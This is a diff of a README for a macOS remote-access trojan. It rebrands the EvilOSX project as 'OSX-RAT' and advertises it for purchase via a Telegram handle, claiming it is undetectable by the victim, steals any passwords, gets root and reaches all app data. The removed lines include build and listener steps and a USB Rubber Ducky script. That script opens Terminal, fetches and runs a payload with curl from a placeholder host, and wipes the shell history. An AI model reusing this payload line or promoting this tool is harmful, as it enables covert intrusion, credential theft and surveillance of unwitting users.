@@ -19,66 +19,24 @@
 
 ## Features
 
-- Emulate a simple terminal instance
-- Undetected by anti-virus (randomized hash, [HTTPS](https://en.wikipedia.org/wiki/HTTPS) communication)
+- create a simple terminal instance
+- Undetected by anti-virus
+- Undetectable by user
 - Multi-threaded
 - No dependencies (pure python)
-- Persistent
-- Simple extendable [module](https://github.com/Marten4n6/EvilOSX/blob/master/modules/template.py) system
-- Retrieve Chrome passwords
-- Download and upload files
-- Attempt to get root via local privilege escalation
-- Auto installer, simply run EvilOSX on your target and the rest is handled automatically.
+- Persistent or non-persistent
+- Retrieve any passwords
+- Download and upload files undetected
+- Get root via local privilege escalation
+- Auto installer, simply run OSX-RAT on your target and the rest is handled automatically.
+- Access to all phone data, files and chats from any apps
 
-## How To Use
 
-```bash
-# Clone or download this repository
-$ git clone https://github.com/Marten4n6/EvilOSX
+## Using OSX-RAT
 
-# Go into the repository
-$ cd EvilOSX
-
-# Build EvilOSX which runs on your target
-$ python builder.py
-
-# Start listening for connections
-$ python Server.py
-
-# Lastly, run the built EvilOSX on your target.
-```
-![](https://i.imgur.com/Ce0V8B4.png)
-![](https://i.imgur.com/cWYn7mL.png)
-
-## Motivation
-
-This project was created to be used with my [Rubber Ducky](https://hakshop.com/products/usb-rubber-ducky-deluxe), here's the simple script:
-```
-REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
-REM See https://ducktoolkit.com/vidpid/
-
-DELAY 1000
-GUI SPACE
-DELAY 500
-STRING Termina
-DELAY 1000
-ENTER
-DELAY 1500
-
-REM Kill all terminals after x seconds
-STRING screen -dm bash -c 'sleep 6; killall Terminal'
-ENTER
-
-STRING cd /tmp; curl -s HOST_TO_EVILOSX.py -o 1337.py; python 1337.py; history -cw; clear
-ENTER
-```
-- Termina**l** is spelt that way intentionally, on some systems spotlight won't find the terminal otherwise. <br/>
-- To bypass the keyboard setup assistant make sure you change the VID&PID which can be found [here](https://ducktoolkit.com/vidpid/). <br/>
-  Aluminum Keyboard (ISO) is probably the keyboard VID&PID you are looking for.
-
-## Issues
-
-Feel free to submit any issues or feature requests.
+The repository here on Github gives you a taste of what's going on behind the scenes. The OSX-RAT can be purchased through Telegram: @Hack2Gain. Features can be added as well as setting it to be persistent or not. As the user of the software you will get a user-friendly GUI to control the RAT. Easy to use and easy to hide, this is truly a modern OSX-RAT with a the features you need.
+<br>
+<img src="modules/GUI OSX-RAT.jpg" alt="Hack2Gain" width="250">
 
 ## Credits
 
